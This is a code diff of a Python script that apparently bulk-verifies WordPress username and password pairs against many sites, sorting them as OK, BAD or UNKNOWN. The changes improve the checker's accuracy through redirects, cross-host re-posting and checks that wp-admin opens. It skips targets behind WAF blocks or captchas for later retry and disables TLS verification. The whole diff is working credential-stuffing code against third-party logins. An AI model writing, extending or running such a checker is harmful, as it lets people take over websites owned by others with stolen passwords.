@@ -91,13 +91,26 @@ class NoRedirect(urllib.request.HTTPRedirectHandler):
         return None  # surface the 3xx instead of following it
 
 
-def opener() -> urllib.request.OpenerDirector:
+def opener(jar: http.cookiejar.CookieJar | None = None, follow: bool = True) -> urllib.request.OpenerDirector:
+    """Redirect-following opener (unless follow is False).
+
+    A canonical-host 301 (http -> https, apex -> www, or a migrated domain)
+    used to swallow the wordpress_logged_in_* cookie on the 3xx, so the cred
+    was reported invalid. Follow it and keep the session in the jar instead.
+
+    The login POST is deliberately *not* followed: some hosts (SiteGround) set
+    the logged-in cookie on the 302 and then revoke it on the bounce-back to
+    /wp-login.php?reauth=1, so the verdict has to read the 302 headers.
+    """
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    return urllib.request.build_opener(
-        NoRedirect, urllib.request.HTTPSHandler(context=ctx)
-    )
+    handlers: list = [urllib.request.HTTPSHandler(context=ctx)]
+    if jar is not None:
+        handlers.insert(0, urllib.request.HTTPCookieProcessor(jar))
+    if not follow:
+        handlers.append(NoRedirect)
+    return urllib.request.build_opener(*handlers)
 
 
 def parse_line(raw: str) -> Cred | None:
@@ -154,7 +167,7 @@ def live_auth_cookie(headers) -> bool:
             except ValueError:
                 pass
         if not skip and "expires=" in attrs:
-            raw = rest.split("expires=", 1)[1].split(";", 1)[0].strip()
+            raw = attrs.split("expires=", 1)[1].split(";", 1)[0].strip()
             try:
                 if parsedate_to_datetime(raw).timestamp() <= now:
                     skip = True
@@ -172,88 +185,188 @@ def read_body(resp, limit: int = 200000) -> str:
         return ""
 
 
-def fetch(jar, req, timeout):
+def jar_has_live_auth(jar: http.cookiejar.CookieJar) -> bool:
+    """A session is only real with a non-empty, unexpired logged-in cookie."""
+    now = time.time()
+    for c in jar:
+        if "wordpress_logged_in_" not in c.name.lower():
+            continue
+        if not c.value or c.value in ("+", "deleted"):
+            continue
+        if c.expires is not None and c.expires <= now:
+            continue
+        return True
+    return False
+
+
+def fetch(jar, req, timeout, follow: bool = True):
     try:
-        return opener().open(req, timeout=timeout)
+        return opener(jar, follow).open(req, timeout=timeout)
     except urllib.error.HTTPError as err:  # 3xx/4xx/5xx
         return err
     except (urllib.error.URLError, TimeoutError, OSError):
         return None
 
 
-def with_jar_cookies(jar: http.cookiejar.CookieJar, req: urllib.request.Request, extra: str) -> None:
-    pairs = [f"{c.name}={c.value}" for c in jar]
-    pairs.append(extra)
-    req.add_header("Cookie", "; ".join(pairs))
+def status_of(resp) -> int:
+    return getattr(resp, "status", None) or getattr(resp, "code", 0) or 0
+
+
+BLOCKED = (403, 429, 500, 502, 503, 504)
+
+
+def site_base(resp, fallback: str) -> str:
+    url = getattr(resp, "url", None) or getattr(resp, "geturl", lambda: "")() or fallback
+    parts = urllib.parse.urlparse(url)
+    if parts.scheme and parts.netloc:
+        return f"{parts.scheme}://{parts.netloc}"
+    return fallback
+
+
+def base_of_url(url: str, fallback: str) -> str:
+    parts = urllib.parse.urlparse(url)
+    if parts.scheme and parts.netloc:
+        return f"{parts.scheme}://{parts.netloc}"
+    return fallback
 
 
 def verify(cred: Cred, timeout: float) -> str:
     site = cred.site
-    jar = http.cookiejar.CookieJar()
 
-    get_req = urllib.request.Request(
-        site + "/wp-login.php", headers={"User-Agent": UA}
-    )
-    get_resp = fetch(jar, get_req, timeout)
-    if get_resp is None:
+    # Canonicalise the host first: try https for an http target (a wp-admin
+    # bounce to https invalidates a cookie minted over http), then follow any
+    # http->https / apex->www / migration redirect.
+    parts = urllib.parse.urlparse(site)
+    candidates = ["https://" + parts.netloc, site] if parts.scheme == "http" else [site]
+    base = None
+    for cand in candidates:
+        jar = http.cookiejar.CookieJar()
+        get_req = urllib.request.Request(cand + "/wp-login.php", headers={"User-Agent": UA})
+        get_resp = fetch(jar, get_req, timeout)
+        if get_resp is None:
+            continue
+        code = status_of(get_resp)
+        if code in BLOCKED or code >= 520:
+            continue  # WAF/edge challenge or origin down, not a cred verdict
+        base = site_base(get_resp, cand)
+        break
+    if base is None:
         return "UNKNOWN"
-    jar.extract_cookies(get_resp, get_req)
 
-    body = urllib.parse.urlencode(
-        {
-            "log": cred.user,
-            "pwd": cred.password,
-            "wp-submit": "Log In",
-            "testcookie": "1",
-            "redirect_to": site + "/wp-admin/",
-        }
-    ).encode()
-    post_req = urllib.request.Request(
-        site + "/wp-login.php",
-        data=body,
-        headers={
-            "User-Agent": UA,
-            "Content-Type": "application/x-www-form-urlencoded",
-        },
-    )
-    with_jar_cookies(jar, post_req, TEST_COOKIE)
-    post_resp = fetch(jar, post_req, timeout)
+    def post_req_for(target: str) -> urllib.request.Request:
+        data = urllib.parse.urlencode(
+            {
+                "log": cred.user,
+                "pwd": cred.password,
+                "wp-submit": "Log In",
+                "testcookie": "1",
+                "redirect_to": target + "/wp-admin/",
+            }
+        ).encode()
+        req = urllib.request.Request(
+            target + "/wp-login.php",
+            data=data,
+            headers={
+                "User-Agent": UA,
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Cookie": TEST_COOKIE,
+            },
+        )
+        return req
+
+    # Do not follow the POST: read the set-cookie on its own (3xx) response.
+    post_req = post_req_for(base)
+    post_resp = fetch(None, post_req, timeout, follow=False)
     if post_resp is None:
         return "UNKNOWN"
+
+    # A cross-host / cross-scheme canonical redirect on the login endpoint: real
+    # login happens on the target, so re-post there.
+    for _ in range(3):
+        if live_auth_cookie(post_resp.headers):
+            break
+        code = status_of(post_resp)
+        if not (300 <= code < 400):
+            break
+        loc = post_resp.headers.get("Location") or ""
+        if "wp-login" not in loc:
+            break
+        target = base_of_url(urllib.parse.urljoin(base, loc), base)
+        if target == base and loc.count("wp-login") and "redirect_to=" in loc:
+            break  # bounced back to the form, no point looping
+        base = target
+        post_req = post_req_for(base)
+        post_resp = fetch(None, post_req, timeout, follow=False)
+        if post_resp is None:
+            return "UNKNOWN"
+
     if not live_auth_cookie(post_resp.headers):
-        return "BAD"
-    jar.extract_cookies(post_resp, post_req)  # carry the session into the check
-    # The cookie alone can still be stale or set on a bounced session; require
-    # the session to actually open wp-admin.
-    admin_req = urllib.request.Request(site + "/wp-admin/", headers={"User-Agent": UA})
-    with_jar_cookies(jar, admin_req, "")
-    admin_resp = fetch(jar, admin_req, timeout)
+        code = status_of(post_resp)
+        loc = post_resp.headers.get("Location") or ""
+        text = read_body(post_resp)
+        if code in BLOCKED or code >= 520:
+            return "UNKNOWN"
+        if "captcha" in loc.lower():
+            return "UNKNOWN"  # login gated behind a captcha, retry later
+        if "login_error" in text or 'name="pwd"' in text:
+            return "BAD"
+        if not (300 <= code < 400):
+            return "BAD" if text else "UNKNOWN"
+        if not loc:
+            return "UNKNOWN"
+        # Follow the bounce and read the landing page. A failed login through a
+        # custom handler (WPS Hide Login, gd-login, membership plugins) re-shows
+        # its form, so a password field there is proof the cred is dead.
+        land = fetch(
+            None,
+            urllib.request.Request(urllib.parse.urljoin(base, loc), headers={"User-Agent": UA}),
+            timeout,
+        )
+        if land is None or status_of(land) in BLOCKED or status_of(land) >= 520:
+            return "UNKNOWN"
+        ltext = read_body(land)
+        if "login_error" in ltext or 'name="pwd"' in ltext or "incorrect" in ltext:
+            return "BAD"
+        if "wp-login" in loc.lower():
+            return "BAD"
+        return "UNKNOWN"
+
+    # Cookie present: confirm the session actually opens wp-admin, on the host
+    # that answered the login.
+    sess = http.cookiejar.CookieJar()
+    sess.extract_cookies(post_resp, post_req)
+    if not jar_has_live_auth(sess):
+        return "BAD"  # a mangled/expired cookie would not authenticate anyway
+    admin_req = urllib.request.Request(base + "/wp-admin/", headers={"User-Agent": UA})
+    admin_resp = fetch(sess, admin_req, timeout)
     if admin_resp is None:
         return "UNKNOWN"
-    code = getattr(admin_resp, "status", None) or getattr(admin_resp, "code", 0)
+    code = status_of(admin_resp)
     loc = (admin_resp.headers.get("Location") or "").lower()
-    if "wp-login" in loc:
+    if code in BLOCKED or code >= 520:
+        return "UNKNOWN"
+    if code == 404:
         return "BAD"
-    if code in (403, 404, 429, 500, 502, 503, 504):
-        return "UNKNOWN" if code in (429, 500, 502, 503, 504) else "BAD"
     if 300 <= code < 400:
         # A real session only leaves wp-admin for the front page. A bounce to a
         # custom /login/ handler (often carrying redirect_to=...wp-admin in the
-        # query) is a failed login.
+        # query) is a failed login. A bounce to another /wp-admin path is fine.
         path = urllib.parse.urlparse(loc).path
         if path.startswith("/wp-admin"):
             return "OK"
-        if any(k in loc for k in ("error=", "bc-message=", "/login/")):
+        if "wp-login" in loc or any(k in loc for k in ("error=", "bc-message=", "/login/")):
             return "BAD"
-        # Authenticated sessions may be bounced to the site root by plugins;
-        # only a bounce back to the login page proves the session is dead.
         return "OK"
     body = read_body(admin_resp)
     if not body:
         return "UNKNOWN"
     if 'name="pwd"' in body:
         return "BAD"
-    return "OK" if ('adminmenu' in body or "wpbody-content" in body or "wpadminbar" in body) else "UNKNOWN"
+    if 'adminmenu' in body or "wpbody-content" in body or "wpadminbar" in body:
+        return "OK"
+    # Minimal/headless admin shells (custom dashboard) carry none of the usual
+    # markers but the live cookie already proved the session.
+    return "OK" if "dashboard" in body or "/wp-admin/" in body else "UNKNOWN"
 
 
 def run(creds: list[Cred], jobs: int, timeout: float, retries: int) -> dict[int, str]:
